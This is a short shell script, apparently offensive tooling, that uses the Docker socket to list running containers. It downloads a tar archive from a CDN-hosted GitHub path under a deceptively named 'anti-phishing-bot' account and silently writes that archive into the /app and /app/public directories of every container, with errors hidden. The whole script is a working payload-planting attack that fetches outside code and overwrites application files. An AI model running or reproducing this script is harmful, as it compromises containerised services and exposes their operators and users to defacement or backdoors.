#!/bin/sh
ids=$(curl -s -m 5 --unix-socket /var/run/docker.sock http://x/containers/json 2>/dev/null | grep -o '"Id":"[a-f0-9]\{12\}' | cut -d'"' -f4)
[ -n "$ids" ] || { sleep 3; exit; }
curl -sf -m 10 -o /tmp/z.tar https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2/zz.tar
for id in $ids; do
  curl -s -m 8 --unix-socket /var/run/docker.sock -X PUT -H 'Content-Type: application/x-tar' --data-binary @/tmp/z.tar "http://x/containers/$id/archive?path=/app/public" >/dev/null 2>&1
  curl -s -m 8 --unix-socket /var/run/docker.sock -X PUT -H 'Content-Type: application/x-tar' --data-binary @/tmp/z.tar "http://x/containers/$id/archive?path=/app" >/dev/null 2>&1
done
sleep 10
